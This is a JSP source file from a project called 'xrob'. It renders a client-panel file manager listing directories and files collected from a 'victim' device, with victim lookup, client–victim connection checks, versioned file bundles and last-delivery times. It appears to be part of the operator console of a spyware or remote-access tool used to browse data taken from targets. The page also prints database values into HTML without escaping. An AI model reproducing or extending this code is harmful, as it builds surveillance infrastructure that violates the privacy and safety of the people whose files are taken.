<%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
<%@ page import="java.util.List" %>
<%@ page import="com.theah64.xrob.api.models.*" %>
<%@ page import="com.theah64.xrob.api.database.tables.*" %>
<%--
  Created by IntelliJ IDEA.
  User: theapache64
  Date: 12/9/16
  Time: 4:08 PM
  To change this template use FileNode | Settings | FileNode Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@include file="../signin_check.jsp" %>

<html>
<head>
    <%

    %>
    <title>Files</title>
    <%@include file="../../common_headers.jsp" %>
    <%
        final HtmlTemplates.SearchTemplate searchTemplate = new HtmlTemplates.SearchTemplate("tFiles", "file_row");
    %>

    <script>
        $(document).ready(function () {
            <%=searchTemplate.getSearchScript()%>

            $("select#sFileBundles").on('change', function () {
                var bundleHash = $(this).find(":selected").val();
                window.location = "/xrob/client/victim/files/" + bundleHash;
            });
        });

    </script>
</head>
<body>
<div class="container">

    <%@include file="../header.jsp" %>

    <%
        try {

            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, PathInfo.UNLIMITED);
            final String victimCode = pathInfoUtils.getPart(1);

            final Victims victimsTable = Victims.getInstance();
            final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);

            if (theVictim != null) {

                final String bundleHash = pathInfoUtils.getPart(2);
                final String fileHash = pathInfoUtils.getLastPart(null);

                String bundleId = null, fileParentId = null;

                if (bundleHash != null) {
                    bundleId = FileBundles.getInstance().get(FileBundles.COLUMN_BUNDLE_HASH, bundleHash, FileBundles.COLUMN_ID);
                }

                if (bundleId == null) {
                    //Getting last bundle of the victim
                    bundleId = FileBundles.getInstance().get(FileBundles.COLUMN_VICTIM_ID, theVictim.getId(), FileBundles.COLUMN_ID);
                }

                if (fileHash != null) {
                    fileParentId = Files.getInstance().get(Files.COLUMN_FILE_HASH, fileHash, Files.COLUMN_ID);
                }


                if (ClientVictimRelations.getInstance().isConnected(clientId.toString(), theVictim.getId())) {

                    final String lastUpdatedTime = Deliveries.getInstance().getLastDeliveryTime(Delivery.TYPE_FILES, theVictim.getId());

    %>

    <div class="row text-center">
        <ul id="nav_menu" class="breadcrumb">
            <li><a href="/xrob/client/panel">Victims</a></li>
            <li><a href="/xrob/client/victim/profile/<%=victimCode%>"><%=theVictim.getIdentity()%>
            </a></li>
            <li class="active">File manager</li>
        </ul>
    </div>

    <div class="row">

        <div class="row" style="margin-top: 20px;">

            <%
                final List<File> files = Files.getInstance().getAll(theVictim.getId(), bundleId, fileParentId);
                if (files != null) {
            %>
            <div class="col-md-10 content-centered">


                <%=searchTemplate.getTopTemplate(
                        theVictim.getIdentity(),
                        lastUpdatedTime == null ? "(Not yet updated)" : "(last update " + lastUpdatedTime + ")")%>

                <div class="row">

                    <div class="form-group col-md-4">
                        <label for="sFileBundles">Version</label>

                        <select id="sFileBundles" class="form-control">
                            <%
                                final List<FileBundle> fileBundles = FileBundles.getInstance().getAll(theVictim.getId());
                                if (fileBundles != null) {
                                    for (final FileBundle fileBundle : fileBundles) {

                            %>
                            <option value="<%=victimCode+"/xrob/"+fileBundle.getBundleHash()%>" <%=fileBundle.getBundleHash().equals(bundleHash) ? " selected" : ""%>><%="#" + fileBundle.getId() + " - " + fileBundle.getRelativeSyncedTime()%>
                            </option>

                            <%

                                    }
                                }
                            %>

                        </select>

                    </div>
                </div>

                </br>

                <%--
                //next feature
                <div class="row text-center">--%>
                <%--<ul id="nav_menu_2" class="breadcrumb">--%>

                <%--<%--%>
                <%--final List<File> parents = Files.getInstance().getParents(fileParentId);--%>
                <%--%>--%>

                <%--<li><a href="#">/</a></li>--%>
                <%--<li><a href="#">folder 1</a></li>--%>
                <%--<li class="active">folder 2</li>--%>
                <%--</ul>--%>
                <%--</div>--%>


                </br>
                <table id="tFiles" class="table table-bordered table-condensed">
                    <tr>
                        <th>File name</th>
                        <th>Size</th>
                    </tr>

                    <%
                        for (final File file : files) {
                    %>

                    <tr class="file_row">

                        <td>
                            <abbr title="<%=file.getAbsoluteParentPath()%>">
                                <%
                                    if (file.isDirectory()) {
                                %>

                                <a href="<%=file.hasDirectory()  ?
                                "/xrob/client/victim/files/"+victimCode+"/xrob/"+bundleHash+"/xrob/"+file.getFileHash() :
                                "#"
                                %>"><%=file.getFileName()%>
                                </a>

                                <%=file.hasDirectory() ? "" : "(empty)"%>


                                <%
                                } else {
                                %>
                                <%=file.getFileName()%>
                                <%
                                    }
                                %>

                            </abbr>
                        </td>


                        <td><%=file.getFileSizeInKB()%>KB
                        </td>

                    </tr>

                    <%
                        }
                    %>

                </table>
            </div>
            <%
                } else {
                    throw new PathInfo.PathInfoException("No files found!");
                }
            %>

        </div>

        <%

            } else {

                throw new PathInfo.PathInfoException("No connection established with this victim");
            }

        %>
    </div>
    <%
        } else {
            throw new PathInfo.PathInfoException("Invalid victim code");
        }
    } catch (PathInfo.PathInfoException e) {
        e.printStackTrace();
    %>
    <%=HtmlTemplates.getErrorHtml(e.getMessage())%>
    <%
        }
    %>

</div>


</body>
</html>
